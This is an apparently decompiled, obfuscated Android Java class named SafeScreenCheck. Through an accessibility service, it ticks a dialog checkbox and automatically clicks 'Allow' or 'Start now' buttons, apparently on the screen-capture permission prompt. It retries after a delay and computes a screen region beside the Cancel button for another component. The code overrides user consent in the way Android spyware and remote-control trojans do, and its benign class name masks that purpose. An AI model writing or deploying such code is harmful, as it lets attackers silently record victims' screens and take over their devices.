package accessibility.lib;

import android.graphics.Rect;
import android.os.Handler;
import android.view.accessibility.AccessibilityNodeInfo;

import com.blankj.utilcode.util.ScreenUtils;

import java.util.List;

import accessibility.AccessibilityHelperService;
import accessibility.OprateManager;

public class SafeScreenCheck {

    /* renamed from: 刻槒唱镧詴 */
    public static boolean f21265;

    /* renamed from: 肌緭 */
    public AccessibilityHelperService service;

    /* renamed from: 垡玖 */
    public static boolean m14522() {
        return f21265;
    }

    /* renamed from: 旞莍癡 */
    public /* synthetic */ void m23157() {
        m23161();
        m23159();
    }

    /* renamed from: 祴嚚橺谋肬鬧舘 */
    public static void m23158() {
        f21265 = true;
    }

    /* renamed from: 葋申湋骶映鍮秄憁鎓羭 */
    public static void m23159() {
        f21265 = false;
    }

    /* renamed from: 刻槒唱镧詴 */
    public void m23160() {
        if (this.service != null && m14522() && ExamineUtils.m24113()) {
            if (!m23161()) {
                new Handler().postDelayed(new Runnable() { // from class: 攳艪抣.灞酞輀攼嵞漁綬迹
                    @Override // java.lang.Runnable
                    public final void run() {
                        SafeScreenCheck.this.m23157();
                    }
                }, 1000L);
            } else {
                m23159();
            }
        }
    }

    /* renamed from: 灞酞輀攼嵞漁綬迹 */
    public final boolean m23161() {
        AccessibilityNodeInfo parent;
        AccessibilityNodeInfo m15016 = AccessibilityUtils.findChild(this.service.getRootInActiveWindow(), "android.widget.CheckBox");
        if (m15016 != null) {
            m15016.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        }
        AccessibilityNodeInfo node = AccessibilityUtils.findNodeByText(this.service.getRootInActiveWindow(), "允许");
        if (node == null) {
            node = AccessibilityUtils.findNodeByText(this.service.getRootInActiveWindow(), "立即开始");
        }
        if (node == null) {
            return false;
        }
        List<AccessibilityNodeInfo> m24451 = AccessibilityUtils.findVisibleNodes("android:id/button3");
        AccessibilityNodeInfo accessibilityNodeInfo = null;
        if (m24451 != null && !m24451.isEmpty()) {
            accessibilityNodeInfo = m24451.get(0);
        }
        if (accessibilityNodeInfo == null) {
            accessibilityNodeInfo = AccessibilityUtils.findNode("取消");
        }
        if (accessibilityNodeInfo != null) {
            Rect rect = new Rect();
            accessibilityNodeInfo.getBoundsInScreen(rect);
            int screenWidth = ScreenUtils.getScreenWidth();
            int i = screenWidth / 2;
            if (rect.left <= i) {
                Rect rect2 = new Rect();
                rect2.top = rect.top;
                rect2.bottom = rect.bottom;
                rect2.left = i;
                rect2.right = screenWidth - 200;
                OprateManager.instance().m27687(rect2);
            }
        }

        boolean performAction = node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
        return (performAction || (parent = node.getParent()) == null) ? performAction : parent.performAction(16);
    }

    /* renamed from: 鞈鵚主瀭孩濣痠閕讠陲檓敐 */
    public void m23162(AccessibilityHelperService accessibilityHelperService) {
        this.service = accessibilityHelperService;
    }
}
